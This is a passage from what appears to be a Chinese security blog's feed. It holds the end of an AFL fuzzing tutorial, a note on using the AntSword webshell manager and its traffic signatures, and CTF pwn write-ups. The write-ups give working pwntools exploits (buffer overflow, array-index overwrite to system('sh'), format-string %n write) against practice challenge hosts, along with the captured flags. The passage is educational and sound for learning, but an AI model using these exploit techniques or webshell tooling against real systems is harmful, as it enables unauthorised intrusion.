class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">afl-fuzz -i ./testcases/ -o ./results/ ./vuln<br></code></pre></td></tr></table></figure><p>测试跑起来之后的输出：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><code class="hljs bash">root@e73955bef93e:/pwn/AFL_learning<span class="hljs-comment"># afl-fuzz -i ./testcases/ -o ./results/ ./vuln</span><br>afl-fuzz 2.52b by &lt;lcamtuf@google.com&gt;<br>[+] You have 2 CPU cores and 5 runnable tasks (utilization: 250%).<br>[!] WARNING: System under apparent load, performance may be spotty.<br>[*] Checking CPU core loadout...<br>[+] Found a free CPU core, binding to <span class="hljs-comment">#0.</span><br>[*] Checking core_pattern...<br>[*] Setting up output directories...<br>[+] Output directory exists but deemed OK to reuse.<br>[*] Deleting old session data...<br>[+] Output <span class="hljs-built_in">dir</span> cleanup successful.<br>[*] Scanning <span class="hljs-string">&#x27;./testcases/&#x27;</span>...<br>[+] No auto-generated dictionary tokens to reuse.<br>[*] Creating hard links <span class="hljs-keyword">for</span> all input files...<br>[*] Validating target binary...<br>[*] Attempting dry run with <span class="hljs-string">&#x27;id:000000,orig:test1.txt&#x27;</span>...<br>[*] Spinning up the fork server...<br>[+] All right - fork server is up.<br>    len = 11, map size = 3, <span class="hljs-built_in">exec</span> speed = 3453 us<br>[*] Attempting dry run with <span class="hljs-string">&#x27;id:000001,orig:test2.txt&#x27;</span>...<br>    len = 12, map size = 5, <span class="hljs-built_in">exec</span> speed = 3751 us<br>[*] Attempting dry run with <span class="hljs-string">&#x27;id:000002,orig:test3.txt&#x27;</span>...<br>    len = 14, map size = 4, <span class="hljs-built_in">exec</span> speed = 2962 us<br>[+] All <span class="hljs-built_in">test</span> cases processed.<br><br>[+] Here are some useful stats:<br><br>    Test <span class="hljs-keyword">case</span> count : 3 favored, 0 variable, 3 total<br>       Bitmap range : 3 to 5 bits (average: 4.00 bits)<br>        Exec timing : 2962 to 3751 us (average: 3389 us)<br><br>[*] No -t option specified, so I<span class="hljs-string">&#x27;ll use exec timeout of 20 ms.</span><br><span class="hljs-string">[+] All set and ready to roll!</span><br><span class="hljs-string"></span><br><span class="hljs-string">                        american fuzzy lop 2.52b (vuln)</span><br><span class="hljs-string"></span><br><span class="hljs-string">┌─ process timing ─────────────────────────────────────┬─ overall results ─────┐</span><br><span class="hljs-string">│        run time : 0 days, 0 hrs, 0 min, 42 sec       │  cycles done : 5      │</span><br><span class="hljs-string">│   last new path : none yet (odd, check syntax!)      │  total paths : 3      │</span><br><span class="hljs-string">│ last uniq crash : 0 days, 0 hrs, 0 min, 41 sec       │ uniq crashes : 1      │</span><br><span class="hljs-string">│  last uniq hang : none seen yet                      │   uniq hangs : 0      │</span><br><span class="hljs-string">├─ cycle progress ────────────────────┬─ map coverage ─┴───────────────────────┤</span><br><span class="hljs-string">│  now processing : 0 (0.00%)         │    map density : 0.00% / 0.01%         │</span><br><span class="hljs-string">│ paths timed out : 0 (0.00%)         │ count coverage : 1.00 bits/tuple       │</span><br><span class="hljs-string">├─ stage progress ────────────────────┼─ findings in depth ────────────────────┤</span><br><span class="hljs-string">│  now trying : havoc                 │ favored paths : 3 (100.00%)            │</span><br><span class="hljs-string">│ stage execs : 252/256 (98.44%)      │  new edges on : 3 (100.00%)            │</span><br><span class="hljs-string">│ total execs : 16.0k                 │ total crashes : 39 (1 unique)          │</span><br><span class="hljs-string">│  exec speed : 358.2/sec             │  total tmouts : 0 (0 unique)           │</span><br><span class="hljs-string">├─ fuzzing strategy yields ───────────┴───────────────┬─ path geometry ────────┤</span><br><span class="hljs-string">│   bit flips : 0/208, 0/205, 0/199                   │    levels : 1          │</span><br><span class="hljs-string">│  byte flips : 0/26, 0/23, 0/17                      │   pending : 0          │</span><br><span class="hljs-string">│ arithmetics : 0/1451, 0/172, 0/0                    │  pend fav : 0          │</span><br><span class="hljs-string">│  known ints : 0/140, 0/643, 0/748                   │ own finds : 0          │</span><br><span class="hljs-string">│  dictionary : 0/0, 0/0, 0/18                        │  imported : n/a        │</span><br><span class="hljs-string">│       havoc : 1/6144, 0/5760                        │ stability : 100.00%    │</span><br><span class="hljs-string">│        trim : 29.73%/7, 0.00%                       ├────────────────────────┘</span><br><span class="hljs-string">│─────────────────────────────────────────────────────┘          [cpu000:287%]</span><br></code></pre></td></tr></table></figure><p>其中AFL的界面介绍可以在<a href="https://www.freebuf.com/articles/system/191536.html">https://www.freebuf.com/articles/system/191536.html</a>看到，</p><p>在此案例中，可以看到total paths字段的值为3。当所有执行流都执行完之后差不多就可以终止fuzz了，因为再fuzz下去也不会出现什么新的结果了。</p><h2 id="fuzz结果查看"><a href="#fuzz结果查看" class="headerlink" title="fuzz结果查看"></a>fuzz结果查看</h2><p>终止fuzz之后可以在results目录下找到crash记录，通过回放crash可以找到程序的漏洞，比如我fuzz结束后crash目录下有如下文件。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">./results/crash/id:000000,sig:11,src:000000,op:havoc,rep:128<br></code></pre></td></tr></table></figure><p>将此文件输入到文件中：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs bash">root@e73955bef93e:/pwn/AFL_learning<span class="hljs-comment"># ./vuln  &lt; ./results/crashes/id\:000000\,sig\:11\,src\:000000\,op\:havoc\,rep\:128</span><br>Login:<br>Password:<br>Access Denied.<br>Segmentation fault<br></code></pre></td></tr></table></figure><p>就可以还原crash的情况了，比如这里发现了一个Segmentation fault。</p><blockquote><p>关于fuzz测试还有很多要学的，好好加油吧。</p></blockquote>]]></content>
    
    
    <summary type="html">&lt;blockquote&gt;
&lt;p&gt;AFL全程American Fuzzy Lop，是由安全研究员Michał Zalewski（&lt;a href=&quot;https://twitter.com/lcamtuf&quot;&gt;@lcamtuf&lt;/a&gt;）开发的一款基于覆盖引导（Coverage-guided）的模糊测试工具，它通过记录输入样本的代码覆盖率，从而调整输入样本以提高覆盖率，增加发现漏洞的概率。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h2 id=&quot;AFL安装&quot;&gt;&lt;a href=&quot;#AFL安装&quot; class=&quot;headerlink&quot; title=&quot;AFL安装&quot;&gt;&lt;/a&gt;AFL安装&lt;/h2&gt;&lt;p&gt;AFL在ubuntu下可以直接使用以下指令安装：&lt;/p&gt;
&lt;figure class=&quot;highlight bash&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;code class=&quot;hljs bash&quot;&gt;sudo apt install afl&lt;br&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;</summary>
    
    
    
    <category term="二进制安全" scheme="https://www.hvnt3r.top/categories/%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%AE%89%E5%85%A8/"/>
    
    
    <category term="二进制安全" scheme="https://www.hvnt3r.top/tags/%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%AE%89%E5%85%A8/"/>
    
    <category term="IoT" scheme="https://www.hvnt3r.top/tags/IoT/"/>
    
    <category term="模糊测试" scheme="https://www.hvnt3r.top/tags/%E6%A8%A1%E7%B3%8A%E6%B5%8B%E8%AF%95/"/>
    
  </entry>
  
  <entry>
    <title>中国蚁剑</title>
    <link href="https://www.hvnt3r.top/2020/02/%E4%B8%AD%E5%9B%BD%E8%9A%81%E5%89%91/"/>
    <id>https://www.hvnt3r.top/2020/02/%E4%B8%AD%E5%9B%BD%E8%9A%81%E5%89%91/</id>
    <published>2020-02-10T01:08:23.000Z</published>
    <updated>2022-02-16T12:07:41.985Z</updated>
    
    <content type="html"><![CDATA[<h3 id="相关链接"><a href="#相关链接" class="headerlink" title="相关链接"></a>相关链接</h3><p>文档地址：</p><p><a href="https://doc.u0u.us/zh-hans/getting_started/get_antsword.html">https://doc.u0u.us/zh-hans/getting_started/get_antsword.html</a></p><p>下载地址：</p><p><a href="https://github.com/AntSwordProject/AntSword-Loader/releases">https://github.com/AntSwordProject/AntSword-Loader/releases</a></p><span id="more"></span><h3 id="基本使用"><a href="#基本使用" class="headerlink" title="基本使用"></a>基本使用</h3><p>连接webshell</p><p><img src="https://i.loli.net/2021/02/10/yAOQGmlHo8dR9Cn.png" alt="webshell连接"></p><p>连接成功的界面:</p><p><img src="https://i.loli.net/2021/02/10/5RBCG1aSKvb8dsI.png" alt="image.png"></p><p>功能就是上图中的功能，跟中国菜刀类似。</p><h3 id="流量内容"><a href="#流量内容" class="headerlink" title="流量内容"></a>流量内容</h3><p><img src="https://i.loli.net/2021/02/10/ue67Q4HUSRPEk3F.png" alt="列出文件的相关流量"></p><p>在中国蚁剑中使用虚拟终端运行命令的数据包:</p><p><img src="https://i.loli.net/2021/02/10/zFp3fG4KEw2JXsn.png" alt="在中国蚁剑中使用虚拟终端运行命令的数据包"></p><p>可以看到蚁剑在Windows上通过调用COM打开WScript.shell进行命令执行的操作，每次执行命令都会发送此类数据包，且返回包如果不修改时会有[S]、[E]的符号，如果目标环境的流量审计环境中有此类规则的话触发检测的概率应该还是比较大的。</p><p>蚁剑的默认UA为:</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">User</span>-Agent: antSword/v2.<span class="hljs-number">1</span><br></code></pre></td></tr></table></figure><p>未完待续。。。</p>]]></content>
    
    
    <summary type="html">&lt;h3 id=&quot;相关链接&quot;&gt;&lt;a href=&quot;#相关链接&quot; class=&quot;headerlink&quot; title=&quot;相关链接&quot;&gt;&lt;/a&gt;相关链接&lt;/h3&gt;&lt;p&gt;文档地址：&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;https://doc.u0u.us/zh-hans/getting_started/get_antsword.html&quot;&gt;https://doc.u0u.us/zh-hans/getting_started/get_antsword.html&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;下载地址：&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;https://github.com/AntSwordProject/AntSword-Loader/releases&quot;&gt;https://github.com/AntSwordProject/AntSword-Loader/releases&lt;/a&gt;&lt;/p&gt;</summary>
    
    
    
    <category term="黑客工具" scheme="https://www.hvnt3r.top/categories/%E9%BB%91%E5%AE%A2%E5%B7%A5%E5%85%B7/"/>
    
    
    <category term="WEB安全" scheme="https://www.hvnt3r.top/tags/WEB%E5%AE%89%E5%85%A8/"/>
    
    <category term="蚁剑" scheme="https://www.hvnt3r.top/tags/%E8%9A%81%E5%89%91/"/>
    
  </entry>
  
  <entry>
    <title>攻防世界PWN高手进阶区</title>
    <link href="https://www.hvnt3r.top/2019/11/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8CPWN%E9%AB%98%E6%89%8B%E8%BF%9B%E9%98%B6%E5%8C%BA/"/>
    <id>https://www.hvnt3r.top/2019/11/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8CPWN%E9%AB%98%E6%89%8B%E8%BF%9B%E9%98%B6%E5%8C%BA/</id>
    <published>2019-11-23T12:00:04.000Z</published>
    <updated>2022-02-16T12:06:42.871Z</updated>
    
    <content type="html"><![CDATA[<h3 id="dice-game"><a href="#dice-game" class="headerlink" title="dice_game"></a>dice_game</h3><p>溢出＋随机数</p><span id="more"></span><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> ctypes <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">import</span> re<br><br>context.log_level = <span class="hljs-string">&#x27;Debug&#x27;</span><br><br>libc = cdll.LoadLibrary(<span class="hljs-string">&quot;libc.so.6&quot;</span>)<br><br><span class="hljs-comment">#io = process(&#x27;./dice_game&#x27;)</span><br>io = remote(<span class="hljs-string">&#x27;111.198.29.45&#x27;</span>, <span class="hljs-string">&#x27;43224&#x27;</span>)<br><br>payload = <span class="hljs-string">&#x27;a&#x27;</span> * <span class="hljs-number">0x40</span> + p64(<span class="hljs-number">1</span>)<br>io.sendlineafter(<span class="hljs-string">&quot;Welcome, let me know your name: &quot;</span>, payload)<br><br>libc.srand(<span class="hljs-number">1</span>)<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">50</span>):<br>randnum = (libc.rand()) % <span class="hljs-number">6</span> + <span class="hljs-number">1</span><br>io.sendlineafter(<span class="hljs-string">&quot;point(1~6): &quot;</span>, <span class="hljs-built_in">str</span>(randnum))<br><br>io.recvline()<br>io.recvline()<br>flag = io.recvline()<br><span class="hljs-built_in">print</span> flag<br></code></pre></td></tr></table></figure><p><strong>flag</strong></p><figure class="highlight dns"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dns">cyberpeace&#123;d852e3567fa642894b4bad<span class="hljs-number">82042d53a5</span>&#125;<br></code></pre></td></tr></table></figure><h3 id="forget"><a href="#forget" class="headerlink" title="forget"></a>forget</h3><p>溢出，将v3修改为getflag的函数的地址，使用\x47作为padding即可使得v14为1</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br>context.log_level = <span class="hljs-string">&#x27;Debug&#x27;</span><br><br><span class="hljs-comment">#io = process(&#x27;./forget&#x27;)</span><br>io = remote(<span class="hljs-string">&#x27;111.198.29.45&#x27;</span>, <span class="hljs-string">&#x27;32456&#x27;</span>)<br><br>payload = <span class="hljs-string">&#x27;\x47&#x27;</span> * <span class="hljs-number">32</span> + p32(<span class="hljs-number">0x080486CC</span>)<br><br>io.sendlineafter(<span class="hljs-string">&#x27;&gt;&#x27;</span>, <span class="hljs-string">&#x27;hvnt3r&#x27;</span>)<br>io.sendlineafter(<span class="hljs-string">&#x27;Enter the string to be validate\n&gt;&#x27;</span>, payload)<br><br>io.recvline()<br><br></code></pre></td></tr></table></figure><p><strong>flag</strong></p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">cyberpeace</span>&#123;<span class="hljs-number">36</span>db2d4142ff5529b834e236e2e3c641&#125;<br></code></pre></td></tr></table></figure><h3 id="stack2"><a href="#stack2" class="headerlink" title="stack2"></a>stack2</h3><p>数组未检查范围导致溢出：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;which number to change:&quot;</span>);<br>      __isoc99_scanf(<span class="hljs-string">&quot;%d&quot;</span>, &amp;v5);<br>      <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;new number:&quot;</span>);<br>      __isoc99_scanf(<span class="hljs-string">&quot;%d&quot;</span>, &amp;v7);<br>      v13[v5] = v7;<br></code></pre></td></tr></table></figure><p>下断点确认v13起始地址与ebp的距离为0x84，构造sh的system函数栈帧。</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">from</span> pwn import *<br><br><span class="hljs-attribute">context</span>.log_level = &#x27;Debug&#x27;<br><br><span class="hljs-attribute">io</span> = process(&#x27;./<span class="hljs-number">6</span>abe739ff2af4a7fa6b3c89904389817&#x27;)<br><span class="hljs-attribute">io</span> = remote(&#x27;<span class="hljs-number">111.198.29.45</span>&#x27;, &#x27;<span class="hljs-number">48396</span>&#x27;)<br><br><span class="hljs-attribute">io</span>.sendlineafter(&#x27;How many numbers you have:\n&#x27;, &#x27;<span class="hljs-number">1</span>&#x27;)<br><span class="hljs-attribute">io</span>.sendlineafter(&#x27;Give me your numbers\n&#x27;, &#x27;<span class="hljs-number">1</span>&#x27;)<br><br><span class="hljs-attribute">def</span> write_addr(offset, byte):<br><span class="hljs-attribute">io</span>.sendlineafter(&#x27;<span class="hljs-number">5</span>. exit\n&#x27;, &#x27;<span class="hljs-number">3</span>&#x27;)<br><span class="hljs-attribute">io</span>.sendlineafter(&#x27;which number to change:\n&#x27;, str(offset))<br><span class="hljs-attribute">io</span>.sendlineafter(&#x27;new number:\n&#x27;, str(byte))<br><br><span class="hljs-comment">#08048450   sys_plt</span><br><span class="hljs-attribute">write_addr</span>(<span class="hljs-number">0</span>x84, <span class="hljs-number">0</span>x50)<br><span class="hljs-attribute">write_addr</span>(<span class="hljs-number">0</span>x85, <span class="hljs-number">0</span>x84)<br><span class="hljs-attribute">write_addr</span>(<span class="hljs-number">0</span>x86, <span class="hljs-number">0</span>x04)<br><span class="hljs-attribute">write_addr</span>(<span class="hljs-number">0</span>x87, <span class="hljs-number">0</span>x08)<br><br><span class="hljs-comment">#08048987   string_sh</span><br><span class="hljs-attribute">write_addr</span>(<span class="hljs-number">0</span>x84 + <span class="hljs-number">8</span>, <span class="hljs-number">0</span>x87)<br><span class="hljs-attribute">write_addr</span>(<span class="hljs-number">0</span>x85 + <span class="hljs-number">8</span>, <span class="hljs-number">0</span>x89)<br><span class="hljs-attribute">write_addr</span>(<span class="hljs-number">0</span>x86 + <span class="hljs-number">8</span>, <span class="hljs-number">0</span>x04)<br><span class="hljs-attribute">write_addr</span>(<span class="hljs-number">0</span>x87 + <span class="hljs-number">8</span>, <span class="hljs-number">0</span>x08)<br><br><span class="hljs-attribute">io</span>.sendlineafter(&#x27;<span class="hljs-number">5</span>. exit\n&#x27;, &#x27;<span class="hljs-number">5</span>&#x27;)<br><br><span class="hljs-attribute">io</span>.interactive()<br></code></pre></td></tr></table></figure><p><strong>flag</strong></p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">cyberpeace</span>&#123;<span class="hljs-number">4331</span>b59d20df98308bc8ad86307b27a4&#125;<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <summary type="html">&lt;h3 id=&quot;dice-game&quot;&gt;&lt;a href=&quot;#dice-game&quot; class=&quot;headerlink&quot; title=&quot;dice_game&quot;&gt;&lt;/a&gt;dice_game&lt;/h3&gt;&lt;p&gt;溢出＋随机数&lt;/p&gt;</summary>
    
    
    
    <category term="CTF" scheme="https://www.hvnt3r.top/categories/CTF/"/>
    
    
    <category term="PWN" scheme="https://www.hvnt3r.top/tags/PWN/"/>
    
    <category term="二进制安全" scheme="https://www.hvnt3r.top/tags/%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%AE%89%E5%85%A8/"/>
    
    <category term="Linux" scheme="https://www.hvnt3r.top/tags/Linux/"/>
    
  </entry>
  
  <entry>
    <title>攻防世界PWN新手练习区题目</title>
    <link href="https://www.hvnt3r.top/2019/09/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8CPWN%E6%96%B0%E6%89%8B%E7%BB%83%E4%B9%A0%E5%8C%BA%E9%A2%98%E7%9B%AE/"/>
    <id>https://www.hvnt3r.top/2019/09/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8CPWN%E6%96%B0%E6%89%8B%E7%BB%83%E4%B9%A0%E5%8C%BA%E9%A2%98%E7%9B%AE/</id>
    <published>2019-09-18T15:53:40.000Z</published>
    <updated>2022-02-16T12:06:42.871Z</updated>
    
    <content type="html"><![CDATA[<h3 id="get-shell"><a href="#get-shell" class="headerlink" title="get_shell"></a>get_shell</h3><p>直接nc连接cat flag即可：</p><figure class="highlight dns"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dns">cyberpeace&#123;d1070f116850587b8304cd1aa<span class="hljs-number">55565e6</span>&#125;<br></code></pre></td></tr></table></figure><span id="more"></span><h3 id="CGfsb"><a href="#CGfsb" class="headerlink" title="CGfsb"></a>CGfsb</h3><p>格式化字符串漏洞，<a href="https://firmianay.gitbooks.io/ctf-all-in-one/content/doc/3.1.1_format_string.html">漏洞讲解</a></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> __cdecl <span class="hljs-title function_">main</span><span class="hljs-params">(<span class="hljs-type">int</span> argc, <span class="hljs-type">const</span> <span class="hljs-type">char</span> **argv, <span class="hljs-type">const</span> <span class="hljs-type">char</span> **envp)</span><br>&#123;<br>  <span class="hljs-type">int</span> buf; <span class="hljs-comment">// [esp+1Eh] [ebp-7Eh]</span><br>  <span class="hljs-type">int</span> v5; <span class="hljs-comment">// [esp+22h] [ebp-7Ah]</span><br>  __int16 v6; <span class="hljs-comment">// [esp+26h] [ebp-76h]</span><br>  <span class="hljs-type">char</span> s; <span class="hljs-comment">// [esp+28h] [ebp-74h]</span><br>  <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> v8; <span class="hljs-comment">// [esp+8Ch] [ebp-10h]</span><br><br>  v8 = __readgsdword(<span class="hljs-number">0x14</span>u);<br>  setbuf(<span class="hljs-built_in">stdin</span>, <span class="hljs-number">0</span>);<br>  setbuf(<span class="hljs-built_in">stdout</span>, <span class="hljs-number">0</span>);<br>  setbuf(<span class="hljs-built_in">stderr</span>, <span class="hljs-number">0</span>);<br>  buf = <span class="hljs-number">0</span>;<br>  v5 = <span class="hljs-number">0</span>;<br>  v6 = <span class="hljs-number">0</span>;<br>  <span class="hljs-built_in">memset</span>(&amp;s, <span class="hljs-number">0</span>, <span class="hljs-number">0x64</span>u);<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;please tell me your name:&quot;</span>);<br>  read(<span class="hljs-number">0</span>, &amp;buf, <span class="hljs-number">0xA</span>u);<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;leave your message please:&quot;</span>);<br>  fgets(&amp;s, <span class="hljs-number">100</span>, <span class="hljs-built_in">stdin</span>);<br>  <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;hello %s&quot;</span>, &amp;buf);<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;your message is:&quot;</span>);<br>  <span class="hljs-built_in">printf</span>(&amp;s);<br>  <span class="hljs-keyword">if</span> ( pwnme == <span class="hljs-number">8</span> )<br>  &#123;<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;you pwned me, here is your flag:\n&quot;</span>);<br>    system(<span class="hljs-string">&quot;cat flag&quot;</span>);<br>  &#125;<br>  <span class="hljs-keyword">else</span><br>  &#123;<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Thank you!&quot;</span>);<br>  &#125;<br>  <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>使用%x定位位置</p><figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs llvm"> ⚡ root<span class="hljs-title">@kali</span> ~ nc <span class="hljs-number">111.198</span>.<span class="hljs-number">29.45</span> <span class="hljs-number">59649</span><br>please tell me your name:<br>hvnt<span class="hljs-number">3</span>r<br>leave your message please:<br>aaaa<span class="hljs-variable">%x.</span><span class="hljs-variable">%x.</span><span class="hljs-variable">%x.</span><span class="hljs-variable">%x.</span><span class="hljs-variable">%x.</span><span class="hljs-variable">%x.</span><span class="hljs-variable">%x.</span><span class="hljs-variable">%x.</span><span class="hljs-variable">%x.</span><span class="hljs-variable">%x.</span><span class="hljs-variable">%x.</span><span class="hljs-variable">%x.</span><span class="hljs-variable">%x.</span><span class="hljs-variable">%x.</span><span class="hljs-variable">%x.</span><span class="hljs-variable">%x.</span><br>hello hvnt<span class="hljs-number">3</span>r<br>your message is:<br>aaaaffba<span class="hljs-number">298</span>e.f<span class="hljs-number">77</span><span class="hljs-keyword">c</span><span class="hljs-number">55</span>a<span class="hljs-number">0</span>.f<span class="hljs-number">0</span>b<span class="hljs-number">5</span>ff.ffba<span class="hljs-number">29</span>be.<span class="hljs-number">1</span>.<span class="hljs-keyword">c</span><span class="hljs-number">2.766848</span>fb.<span class="hljs-number">7233746</span>e.a.<span class="hljs-number">61616161.252e7825.78252</span>e<span class="hljs-number">78.2e78252</span>e.<span class="hljs-number">252e7825.78252</span>e<span class="hljs-number">78.2e78252</span>e.<br>Thank you!<br></code></pre></td></tr></table></figure><p>定位到printf第一个参数位置位于10，构造脚本，使用%n进行数据写入，需要将pwnme修改为8，因此%n之前有8个字节，使用%10$n定位到第十个偏移量。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br> <br>p = remote(<span class="hljs-string">&#x27;111.198.29.45&#x27;</span>, <span class="hljs-number">59649</span>)<br>pwnme = <span class="hljs-number">0x0804A068</span><br> <br>payload1 = <span class="hljs-string">&#x27;qwer&#x27;</span><br>payload2 = p32(pwnme) + <span class="hljs-string">&#x27;aaaa%10$n&#x27;</span><br> <br>p.recvuntil(<span class="hljs-string">&#x27;please tell me your name:\n&#x27;</span>)<br>p.sendline(payload1)<br>p.recvuntil(<span class="hljs-string">&#x27;leave your message please:\n&#x27;</span>)<br>p.sendline(payload2)<br><span class="hljs-built_in">print</span>(p.recv())<br><span class="hljs-built_in">print</span>(p.recv())<br></code></pre></td></tr></table></figure><p>flag</p><figure class="highlight apache"><table><tr><td 